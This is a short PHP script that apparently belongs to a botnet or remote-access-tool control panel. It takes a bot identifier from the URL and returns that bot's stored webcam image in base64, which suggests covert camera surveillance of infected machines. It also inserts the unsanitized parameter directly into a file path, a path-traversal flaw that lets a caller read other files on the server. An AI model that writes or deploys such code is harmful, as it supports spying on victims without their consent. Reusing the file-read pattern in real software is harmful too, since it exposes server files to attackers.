<?php
$botID = $_GET['botID'];
$data = file_get_contents("tmp/cam-$botID.jpg");
echo base64_encode($data);
?>
